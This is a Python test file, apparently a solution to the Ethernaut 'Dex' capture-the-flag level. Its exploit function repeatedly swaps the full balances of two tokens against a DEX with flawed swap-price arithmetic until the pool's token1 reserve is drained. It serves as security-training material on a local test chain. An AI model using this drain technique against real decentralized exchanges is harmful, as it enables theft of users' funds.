from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv22_dex import Dex, SwappableToken
from pytypes.lib.openzeppelincontracts.contracts.interfaces.draftIERC6093 import IERC20Errors

@default_chain.connect()
def test_lv22():
    ethernaut = EthernautDeployer(default_chain)
    (contract, token1, token2) = ethernaut.deploy_lv22()
    exploit_lv22(contract, token1, token2, ethernaut.attacker)
    ethernaut.check_lv22(contract, token1, token2)

def exploit_lv22(contract: Dex, token1: SwappableToken, token2: SwappableToken, attacker: Account):
    # Attack vector: incorrect calculation in DEX
    # Training: math in python

    start_balance_token1 = contract.balanceOf(token=token1, account=attacker.address)
    start_balance_token2 = contract.balanceOf(token=token2, account=attacker.address)
    current_balance_token1 = start_balance_token1
    current_balance_token2 = start_balance_token2

    while True:
        try:

            additional_token2 = (current_balance_token1 * contract.balanceOf(token=token2, account=contract.address)) // contract.balanceOf(token=token1, account=contract.address)
            token1.approve(owner=attacker.address, spender=contract.address, amount=current_balance_token1)
            contract.swap(from__=token1, to_=token2, amount=current_balance_token1, from_=attacker.address)
            current_balance_token2 += additional_token2
            current_balance_token1 = 0

            
            additional_token1 = (current_balance_token2 * contract.balanceOf(token=token1, account=contract.address)) // contract.balanceOf(token=token2, account=contract.address)
            token2.approve(owner=attacker.address, spender=contract.address, amount=current_balance_token2)
            contract.swap(from__=token2, to_=token1, amount=current_balance_token2, from_=attacker.address)
            current_balance_token1 += additional_token1
            current_balance_token2 = 0

            
        except IERC20Errors.ERC20InsufficientBalance as e:
            dex_amount =  token1.balanceOf(contract.address)
            payload_amount = dex_amount * contract.balanceOf(token=token2, account=contract.address) // contract.balanceOf(token=token1, account=contract.address)
            contract.swap(from__=token2, to_=token1, amount=payload_amount, from_=attacker.address)
            break
